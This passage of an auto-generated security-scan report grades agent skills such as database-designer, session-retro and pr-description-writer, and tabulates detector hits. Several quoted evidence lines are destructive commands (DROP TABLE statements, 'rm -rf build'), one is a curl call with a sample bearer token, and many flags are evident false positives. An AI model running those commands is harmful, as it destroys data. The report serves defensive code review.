> Audit data quality across pipelines, warehouses, and stores. Use when designing a DQ program, defining DQ dimensions, building rule-based checks, detecting schema drift, monitoring freshness SLAs, or 

| Severity | Detector | Where | Context | Evidence |
| --- | --- | --- | --- | --- |
| **high** | `persistence` | `scripts/dq_check_runner.py:387` | plain | `profile = profile_data(rows) if args.profile else None` |

### B · 80/100 · `database-designer`

`engineering/database-designer` — tier 3 (exec)

> Analyse an existing SQL schema for normalization and constraint gaps, recommend indexes from query patterns, and generate forward/rollback migrations. Use when reviewing DDL, tuning indexes, or diffin

| Severity | Detector | Where | Context | Evidence |
| --- | --- | --- | --- | --- |
| **high** | `destructive` | `expected_outputs/migration_sample.txt:37` | plain | `Rollback SQL: DROP TABLE IF EXISTS brands;` |
| **high** | `destructive` | `scripts/migration_generator.py:495` | quote | `drop_sql = f"DROP TABLE IF EXISTS {table.name};"` |

### B · 80/100 · `database-schema-designer`

`engineering/database-schema-designer` — tier 3 (exec)

> Design a new relational schema from product requirements: tables, ORM models, RLS, indexes, migrations and an ERD. Use when modelling a new feature, adding multi-tenancy or soft deletes, or writing Dr

| Severity | Detector | Where | Context | Evidence |
| --- | --- | --- | --- | --- |
| **high** | `destructive` | `scripts/migration_diffr.py:9` | plain | `- DROP TABLE for removed tables` |

### B · 80/100 · `md-slides`

`markdown-html/md-slides` — tier 3 (exec)

> Convert markdown into a self-contained HTML slide deck with layouts, speaker notes, keyboard navigation, and a content-density linter. Use when building a deck from markdown, cutting an overloaded dec

| Severity | Detector | Where | Context | Evidence |
| --- | --- | --- | --- | --- |
| **high** | `persistence` | `scripts/slide_density_linter.py:240` | plain | `blocking = output(audit(slides, args.profile), slides,` |

### B · 80/100 · `session-retro`

`workflow/session-retro` — tier 3 (exec)

> Review a coding-agent session and turn its failures and waste into ranked fixes to the agent's environment. Use when a session went slow or wrong, after a messy agent run, or to tune CLAUDE.md or AGEN

| Severity | Detector | Where | Context | Evidence |
| --- | --- | --- | --- | --- |
| **high** | `destructive` | `assets/sample_action_items.json:34` | quote | `"evidence": "calls #15-#16: rm -rf build denied twice, retried unchanged",` |
| **medium** | `destructive` | `references/fix-placement-and-steering-style.md:49` | inline-code | `- **State the positive target.** "Use `make clean` to remove build output" steers better than "Do not run `rm ` |

### B · 80/100 · `sql-database-assistant`

`engineering/sql-database-assistant` — tier 3 (exec)

> Review SQL queries for index and scan problems, document schemas from DDL, and generate migrations with rollback and destructive-change flags. Use when tuning a query, documenting a schema, or diffing

| Severity | Detector | Where | Context | Evidence |
| --- | --- | --- | --- | --- |
| **high** | `destructive` | `scripts/migration_generator.py:6` | plain | `and DROP TABLE statements to migrate from one schema to another, with a DOWN script.` |

### B · 80/100 · `synthetic-buyer-panel`

`research-ops/synthetic-buyer-panel` — tier 3 (exec)

> Simulated buyer panel: deal reproducible persona cards, run one agent per buyer, tally buy rates, objections and price corridors. Use when asking "would people buy this", pre-testing a pitch, or findi

| Severity | Detector | Where | Context | Evidence |
| --- | --- | --- | --- | --- |
| **high** | `persistence` | `scripts/panel_deal.py:231` | plain | `profile = load(args.profile)` |

### B · 84/100 · `pr-description-writer`

`engineering/pr-description-writer` — tier 3 (exec)

> Write PR descriptions with evidence, verification steps and a one-way/two-way merge-risk call. Use when opening a PR, when asked to write or fix a PR body, or when checking a description before reques

| Severity | Detector | Where | Context | Evidence |
| --- | --- | --- | --- | --- |
| **medium** | `network-egress` | `assets/sample_pr_body_flawed.md:13` | plain | `curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0ZXN0In0.abc123def456ghi789" https://staging.ex` |
| **medium** | `destructive` | `references/merge-risk-classification.md:48` | inline-code | `\| `DROP TABLE` / `DROP COLUMN` / `drop_column(...)` \| Data is gone \|` |
| **medium** | `network-egress` | `references/pr-body-anatomy.md:67` | plain | `\| 3 \| Command or log output from a real run (CLI, curl, migration plan, `EXPLAIN`) \| Backend, data, infra \|` |
| **medium** | `network-egress` | `SKILL.md:178` | plain | `\| Backend behaviour \| Command output (curl, CLI) from a real run \|` |

### B · 86/100 · `monorepo-navigator`

`engineering/monorepo-navigator` — tier 3 (exec)

> Manage and optimize monorepos with Turborepo, Nx, pnpm workspaces, and Changesets. Use when working in monorepos, running impact analysis, optimizing build times with remote caching, migrating from mu

| Severity | Detector | Where | Context | Evidence |
| --- | --- | --- | --- | --- |
| **medium** | `secret-access` | `references/operations-and-best-practices.md:33` | inline-code | `\| `ERR_PNPM_PEER_DEP_ISSUES` on install \| Peer dependency mismatches across workspace packages \| Add `peerDepe` |
| **low** | `dotenv-access` | `references/tooling-and-configuration.md:63` | fence | `"globalDependencies": ["**/.env.*local"],` |
| **low** | `unpinned-install` | `references/tooling-and-configuration.md:159` | fence | `pnpm add zod --filter @repo/api` |

### B · 86/100 · `saas-scaffolder`

`engineering/saas-scaffolder` — tier 3 (exec)

> Lays down a Next.js SaaS skeleton (provider-specific deps, env, Drizzle tenancy schema, middleware) and guides auth, billing and tenant isolation. Use when starting a SaaS, subscription app or multi-t

| Severity | Detector | Where | Context | Evidence |
| --- | --- | --- | --- | --- |
| **medium** | `network-egress` | `references/auth-billing-and-tenancy.md:3` | plain | `Read this when wiring up NextAuth, building the Stripe checkout/webhook/portal flow, protecting routes with mi` |
| **medium** | `network-egress` | `references/workflow-and-quality.md:40` | plain | `19. Implement webhook handler with signature verification` |
| **medium** | `network-egress` | `scripts/saas_scaffolder.py:126` | quote | `("app/api/webhooks", f"{REF_AUTH} (Webhook Handler)"),` |
| **medium** | `network-egress` | `SKILL.md:54` | plain | `5. Done when: `npm run build` passes, no `STUB generated` files remain, a test checkout updates the subscripti` |
| **low** | `dotenv-access` | `references/project-structure-and-schema.md:80` | fence | `├── .env.example` |
| **low** | `dotenv-access` | `scripts/saas_scaffolder.py:5` | plain | `a provider-filtered .env.example, a Drizzle schema shaped by --tenancy, configs and` |
| **low** | `unpinned-install` | `scripts/saas_scaffolder.py:293` | quote | `print("next/react/tailwind use ^ ranges; other deps use npm tags. Run npm install once and commit the lockfile` |

### B · 86/100 · `senior-fullstack`

`engineering/senior-fullstack` — tier 3 (exec)

> Fullstack development toolkit with project scaffolding for Next.js/FastAPI/MERN/Django stacks and code quality analysis. Use when scaffolding new projects, analyzing codebase quality, or implementing 

| Severity | Detector | Where | Context | Evidence |
| --- | --- | --- | --- | --- |
| **medium** | `network-egress` | `scripts/project_scaffolder.py:468` | plain | `const res = await fetch(`${baseUrl}${endpoint}`, {` |
| **low** | `dotenv-access` | `references/development_workflows.md:99` | fence | `# .env.local (development)` |
| **low** | `dotenv-access` | `references/tooling-workflows-and-quality.md:158` | fence | `cp .env.example .env.local` |
| **low** | `dotenv-access` | `scripts/code_quality_analyzer.py:31` | quote | `CONFIG_EXTENSIONS = {".json", ".yaml", ".yml", ".toml", ".env"}` |
| **low** | `dotenv-access` | `scripts/project_scaffolder.py:36` | quote | `"next.config.js", ".env.example", ".gitignore", "README.md"]` |
| **low** | `unpinned-install` | `scripts/project_scaffolder.py:666` | plain | `RUN npm install COPY . .` |

### B · 89/100 · `browser-automation`

`engineering/browser-automation` — tier 3 (exec)

> Generates polite, rate-limited scraper and form-submission scripts (requests, no JS) and audits automation code for blocking and overload risks. Use when writing a permitted scraper, scripting a form 

| Severity | Detector | Where | Context | Evidence |
| --- | --- | --- | --- | --- |
| **medium** | `network-egress` | `assets/sample_bare_scraper.py:15` | plain | `html = requests.get(f"https://example.com/catalog?page={page}", headers=HEADERS).text` |
| **low** | `unpinned-install` | `scripts/scraping_toolkit.py:146` | plain | `NOTE: This is a template. Install requests library: pip install requests` |

### B · 89/100 · `performance-profiler`

`engineering/performance-profiler` — tier 3 (exec)

> Performance profiling for Node.js, Python, and Go: CPU flamegraphs, memory leak detection, bundle analysis, query optimization, and k6 load testing. Use when diagnosing slow endpoints, memory growth, 

| Severity | Detector | Where | Context | Evidence |
| --- | --- | --- | --- | --- |
| **medium** | `privilege-escalation` | `references/load-testing-and-methodology.md:151` | inline-code | `\| `py-spy` cannot attach to running process \| Insufficient permissions or SIP (System Integrity Protection) on` |
| **low** | `unpinned-install` | `references/cpu-and-memory-profiling.md:99` | fence | `pip install memray` |

### B · 89/100 · `senior-computer-vision`

`engineering/senior-computer-vision` — tier 3 (exec)

> Computer vision engineering for object detection, segmentation, and visual AI, covering CNN and Vision Transformer architectures and ONNX/TensorRT deployment. Use when building detection pipelines, tr

| Severity | Detector | Where | Context | Evidence |
| --- | --- | --- | --- | --- |
| **medium** | `ip-literal-url` | `references/production_vision_systems.md:754` | fence | `inference_address=http://0.0.0.0:8080` |
| **low** | `unpinned-install` | `scripts/inference_optimizer.py:435` | plain | `'onnxruntime': f'pip install onnxruntime-gpu',` |

### B · 89/100 · `senior-qa`

`engineering/senior-qa` — tier 3 (exec)

> Testing for React/Next.js with Jest, React Testing Library, and Playwright. Use when generating tests, writing unit tests, analyzing coverage, scaffolding E2E tests, configuring Jest, or improving tes

| Severity | Detector | Where | Context | Evidence |
| --- | --- | --- | --- | --- |
| **medium** | `network-egress` | `references/qa_best_practices.md:34` | fence | `import { sendEmail } from '../lib/email';` |
| **medium** | `network-egress` | `references/test_automation_patterns.md:606` | fence | `sendEmail: jest.fn().mockResolvedValue({ success: true }),` |
| **medium** | `network-egress` | `references/testing_strategies.md:180` | fence | `fetch(`/api/users/${userId}`)` |
| **low** | `env-key-reference` | `references/qa_best_practices.md:600` | fence | `const stripe = new Stripe(process.env.STRIPE_KEY);` |


<sub>Generated by `scripts/build.mjs`. Do not edit directly.</sub>
